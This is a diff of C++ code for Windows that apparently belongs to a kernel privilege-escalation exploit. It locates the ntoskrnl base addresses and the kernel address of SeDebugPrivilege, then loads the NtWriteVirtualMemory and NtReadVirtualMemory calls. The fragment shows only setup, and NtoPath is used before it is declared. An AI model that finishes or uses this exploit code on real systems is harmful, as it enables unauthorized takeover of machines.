@@ -1,4 +1,3 @@
-
 #include "ex.h"
 
 #pragma comment(lib, "ntdll.lib")
@@ -26,20 +25,21 @@ int main()
     NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
     NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
 
-    NTOKernelBase = GetModuleAddrByName((LPCSTR)NtoPath); 
-    printf("[+] ntoskrnl kernel base: %llx\n", NTOKernelBase);
+    NTOKernelBase = GetModuleAddrByName((LPCSTR)NtoPath);
     NTOUserBase = GetModuleByName(wNtoPath);
+    printf("[+] ntoskrnl kernel base: %llx\n", NTOKernelBase);
     printf("[+] ntoskrnl user base: %llx\n", (DWORD64)NTOUserBase);
 
     SeDebugPrivilegeAddrOffset = FindSeDebugPrivilegeOffset(NTOUserBase);
-    printf("[+] SeDebugPrivilege offset: %llx\n", SeDebugPrivilegeAddrOffset);
-
     SeDebugPrivilegeAddr = NTOKernelBase + SeDebugPrivilegeAddrOffset;
+    printf("[+] SeDebugPrivilege offset: %llx\n", SeDebugPrivilegeAddrOffset);
     printf("[+] SeDebugPrivilege: %llx\n", SeDebugPrivilegeAddr);
 
 
-    LPCSTR NtoPath = "\\SystemRoot\\system32\\ntoskrnl.exe";
-    char ExpandedPath[MAXIMUM_FILENAME_LENGTH];
+    LPCWSTR NtoPath = L"\\SystemRoot\\system32\\ntoskrnl.exe";
+    WCHAR ExpandedPath[MAXIMUM_FILENAME_LENGTH];
     // 展开环境变量，ExpandedPath 包含了完整的文件路径
-    ExpandEnvironmentStrings(NtoPath, ExpandedPath, MAX_PATH);
+    ExpandEnvironmentStrings(NtoPath, ExpandedPath, 255);
+
+    std::wcout << ExpandedPath << std::endl;
 }
